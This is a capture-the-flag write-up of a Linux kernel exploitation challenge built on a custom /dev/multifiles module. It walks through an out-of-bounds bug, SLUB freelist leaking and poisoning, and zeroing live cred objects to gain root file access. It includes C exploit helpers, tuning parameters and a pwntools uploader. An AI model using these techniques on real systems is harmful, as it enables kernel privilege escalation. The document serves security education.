# multifiles

**Category:** Pwn

## Description

> pwn/multifiles 8 solves / 486 points
>
> Athryx simple slop in kernel, wouldn't want to spoil it
>
> `ncat --ssl multifiles.opus4-7.b01le.rs 8443`
>
> Format: `bctf{}`

## Overview

The challenge is a Linux kernel pwn around a custom character device, `/dev/multifiles`.
The module allocates `MultiFile` objects from a dedicated SLUB cache named `multifiles_cache`.

The bug is in the `read` and `write` handlers. They validate `f_pos` against
`sizeof(MultiFile)`, but the copy base is `&multi_file->data[0]`, which is already 0x20 bytes into
the object. This gives controlled out-of-bounds access into the next `MultiFile` object on the same
slab page.

That OOB access reaches the next object's SLUB freelist pointer. By freeing adjacent objects, leaking
encoded freelist pointers, and recovering the per-cache SLUB random, we can poison the
`multifiles_cache` freelist. The final primitive is:

```text
chosen kernel address -> zero 160 bytes -> fail cache-membership usercopy -> kfree(target)
```

The endgame is to free many known `multifiles_cache` pages, force the `cred` slab cache to reuse one
of those pages, and then use the primitive against candidate `struct cred` slots. Zeroing a live
credential makes a child process able to open `/root/flag.txt`, which prints:

```text
bctf{u_sloved_the_challeng_yipee_bac4fb7a21a20f8a}
```

## Technical details

### Vulnerable object layout

The vulnerable object is:

```c
typedef struct {
    u64 type;              // 0x00
    u64 flags;             // 0x08
    char name[16];         // 0x10
    u64 data[16];          // 0x20
} MultiFile;               // sizeof = 0xa0 = 160
```

The module checks:

```c
if (
    count > MAX_RW_SIZE
    || (count % sizeof(u64)) != 0
    || *offset >= sizeof(MultiFile)
    || *offset < 0
) {
    ret = -EINVAL;
    goto out_unlock;
}
```

but then copies from:

```c
((u8 *)&multi_file->data[0]) + old_offset
```

Because `data` begins at object offset `0x20`, `lseek(fd, 152, SEEK_SET); read(fd, buf, 64);` starts
copying from:

```text
current_object + 0x20 + 0x98 = current_object + 0xb8
```

Since each object is 0xa0 bytes, this lands in the next object:

```text
next_object + 0x18
```

The 64-byte copy reaches `next_object + 0x57`, which includes the freelist pointer at offset `0x50`.

### Freelist leak

For a 160-byte object, each 4K page contains 25 `MultiFile` objects. We allocate a full page and use
three consecutive objects:

```text
A | B | C
```

The leak sequence is:

1. Free `C`.
2. Read from `B` into `C`'s freed freelist field to leak `enc_C`.
3. Free `B`.
4. Read from `A` into `B`'s freed freelist field to leak `enc_B`.

In the exploit:

```c
static u64 leak_next_freeptr(int pfd, int left_idx) {
    unsigned char buf[64];
    mf_set(pfd, left_idx);
    mf_seek(pfd, 152);
    mf_readn(pfd, buf, sizeof(buf));
    u64 v;
    memcpy(&v, buf + 56, 8);
    return v;
}
```

The page leak helper:

```c
static struct page_leak leak_page_triplet(int pfd, int left, int mid, int right) {
    struct page_leak out = {0};

    mf_delete(pfd, right);
    out.enc_c = leak_next_freeptr(pfd, mid);

    mf_delete(pfd, mid);
    out.enc_b = leak_next_freeptr(pfd, left);

    out.obj_c = (out.enc_b ^ out.enc_c) ^ 0x6001000000000000ULL;
    out.page_base = out.obj_c - 0x140ULL;
    return out;
}
```

SLUB freelist hardening encodes pointers as:

```text
encoded = next ^ cache_random ^ bswap64(freeptr_addr)
```

When `C` is the tail object, its decoded next pointer is NULL, so:

```c
cache_random = enc_C ^ bswap64(C_addr + 0x50)
```

### Freelist poisoning

After recovering `cache_random`, we can encode any target pointer for a freed `MultiFile` object:

```c
static u64 encode_freelist_ptr(u64 obj_addr, u64 target, u64 rnd) {
    return target ^ rnd ^ __builtin_bswap64(obj_addr + 80);
}
```

The OOB write places this encoded pointer into the freed neighbor object:

```c
static void poison_next_freeptr(int pfd, int left_idx, u64 encoded) {
    unsigned char buf[64];
    memset(buf, 0, sizeof(buf));
    memcpy(buf + 56, &encoded, 8);
    mf_set(pfd, left_idx);
    mf_seek(pfd, 152);
    mf_writen(pfd, buf, sizeof(buf));
}
```

The critical exploit-ordering fix was to make the poisoned object the actual freelist head. The final
exploit:

1. leaks using the first page triplet
2. immediately reclaims the primitive objects
3. leaks addresses for 159 donor pages
4. frees all donor pages
5. only then frees the primitive middle object
6. poisons that freshly freed primitive object while it is the freelist head

After poisoning:

```text
first CREATE  -> returns primitive object B
second CREATE -> returns attacker-selected target
```

### Cross-cache zero/free primitive

The create path is:

```c
MultiFile *multi_file = kmem_cache_zalloc(multifiles_cache, GFP_KERNEL);

if (kmem_cache_copy_from_user(
    multifiles_cache,
    multi_file->name,
    (void __user *)arg,
    sizeof(MultiFileCreateReq)
) != 0) {
    kfree(multi_file);
    ret = -EFAULT;
    goto out_unlock;
}
```

If the poisoned second allocation returns an address that does not belong to `multifiles_cache`, the
following happens:

1. `kmem_cache_zalloc(multifiles_cache)` zeroes 160 bytes at the target.
2. `kmem_cache_copy_from_user()` detects that the pointer is not a `multifiles_cache` object.
3. The wrapper returns failure.
4. The error path calls `kfree(target)`.

This is enough to corrupt a live object from another slab cache.

### Cred placement

The target cache is `cred`. On this kernel it has:

```text
object_size = 184
slab_size   = 192
objs_per_slab = 21
```

So candidate cred slots on a reused donor page are:

```text
target = donor_page_base + 192 * slot
slot   = 0..20
```

The exploit allocates 80 lists with 50 objects each, producing 160 full `multifiles_cache` pages. One
page is kept for the primitive, and the remaining 159 pages become donor pages. Donor pages are scanned
from most-recently-freed to older pages.

The child spray is synchronized:

1. prefork children
2. children wait
3. parent frees donor pages
4. parent releases children
5. each child performs repeated same-UID `setgid(1000); setuid(1000);` credential commits
6. children wait while parent scans target slots
7. parent wakes children after corrupting a page
8. children repeatedly try `open("/root/flag.txt")`

The stable parameters were:

```text
MF_CHILDREN=256
MF_CRED_COMMITS=8
MF_OPEN_ONLY=1
MF_WAIT_SLEEP_US=50000
MF_CHILD_SLEEP_US=1000
MF_READY_WAIT_US=6000000
MF_CONTINUE_FOREIGN=1
MF_WAKE_PER_PAGE=1
MF_MAX_FOREIGN=420
MF_FOREIGN_DELAY_US=500000
```

`MF_OPEN_ONLY=1` matters. After corruption, children should only try opening the flag. Calling
`setuid(0)` after corrupting non-winning cred-cache state can crash in `prepare_creds()`.

## Proof-of-Concept

The final exploit source is:

```text
exploit_multifiles_skeletons.c
```

Build the static exploit:

```bash
musl-gcc -static -O2 -Wall -Wextra \
  -o exploit_multifiles_musl exploit_multifiles_skeletons.c
cp exploit_multifiles_musl exploit_multifiles
```

Local reproduction:

```bash
MF_RUN_ENV='MF_CHILDREN=256 MF_CRED_COMMITS=8 MF_OPEN_ONLY=1 MF_WAIT_SLEEP_US=50000 MF_CHILD_SLEEP_US=1000 MF_READY_WAIT_US=6000000 MF_CONTINUE_FOREIGN=1 MF_WAKE_PER_PAGE=1 MF_MAX_FOREIGN=420 MF_FOREIGN_DELAY_US=500000' \
MF_TIMEOUT=220 \
python3 ./local_test.py
```

Remote solve uses `solve.py` to upload the compiled exploit through the TLS serial shell:

```python
from pwn import *
import base64
import time
import sys

HOST = 'multifiles.opus4-7.b01le.rs'
PORT = 8443
FILE_NAME = 'exploit_multifiles_musl'
CHUNK_SIZE = 100
PROMPT = b'$ '

try:
    with open(FILE_NAME, 'rb') as f:
        encoded_payload = base64.b64encode(f.read()).decode()
except FileNotFoundError:
    print(f"[-] Error: Could not find '{FILE_NAME}'.")
    sys.exit(1)

print(f"[*] Connecting to {HOST}:{PORT} over SSL...")
r = remote(HOST, PORT, ssl=True)

print("[*] Waiting for the boot sequence to finish...")
r.recvuntil(PROMPT)

print("[*] Disabling echo and initiating heredoc...")
r.sendline(b"stty -echo")
time.sleep(0.5)

r.sendline(b"cat > /tmp/exploit.b64 <<'EOF'")
time.sleep(0.1)

print(f"[*] Streaming {len(encoded_payload)} bytes into heredoc...")
for i in range(0, len(encoded_payload), CHUNK_SIZE):
    chunk = encoded_payload[i:i+CHUNK_SIZE]
    r.sendline(chunk.encode())
    time.sleep(0.01)

    if i % (CHUNK_SIZE * 50) == 0 and i > 0:
        print(f"    Sent {i} / {len(encoded_payload)} bytes")

print("[*] Finalizing heredoc...")
r.sendline(b"EOF")
time.sleep(0.5)

print("[*] Restoring terminal and decoding base64...")
r.sendline(b"stty echo")
time.sleep(0.5)
r.clean()

r.sendline(b"base64 -d /tmp/exploit.b64 > /tmp/exploit")
r.recvuntil(PROMPT)

r.sendline(b"chmod +x /tmp/exploit")
r.recvuntil(PROMPT)

print("[*] Executing exploit with environment variables...")
exploit_cmd = "MF_CHILDREN=256 MF_CRED_COMMITS=8 MF_OPEN_ONLY=1 MF_WAIT_SLEEP_US=50000 MF_CHILD_SLEEP_US=1000 MF_READY_WAIT_US=6000000 MF_CONTINUE_FOREIGN=1 MF_WAKE_PER_PAGE=1 MF_MAX_FOREIGN=420 MF_FOREIGN_DELAY_US=500000 /tmp/exploit"
r.sendline(exploit_cmd.encode())

print("[+] Exploit running. Dropping to interactive shell.")
r.interactive()
```

Run:

```bash
python3 solve.py
```

Expected output:

```text
[*] Connecting to multifiles.opus4-7.b01le.rs:8443 over SSL...
[*] Waiting for the boot sequence to finish...
[*] Disabling echo and initiating heredoc...
[*] Streaming ... bytes into heredoc...
[*] Finalizing heredoc...
[*] Restoring terminal and decoding base64...
[*] Executing exploit with environment variables...
[+] Exploit running. Dropping to interactive shell.
...
FLAG=bctf{u_sloved_the_challeng_yipee_bac4fb7a21a20f8a}
```

## P/S

Final flag:

```text
bctf{u_sloved_the_challeng_yipee_bac4fb7a21a20f8a}
```

Important files:

- `src/multifiles.c`: vulnerable kernel module.
- `src/kernel-cache-usercopy.diff`: cache-membership usercopy wrapper.
- `exploit_multifiles_skeletons.c`: final kernel exploit.
- `exploit_multifiles_musl`: static exploit binary uploaded to the guest.
- `local_test.py`: local QEMU runner.
- `solve.py`: remote TLS uploader/runner.

The main reliability points were keeping the poisoned primitive object as the freelist head, using 159
donor pages, trying most-recently-freed donor pages first, preforking child credential spray, and using
open-only flag checks after corruption.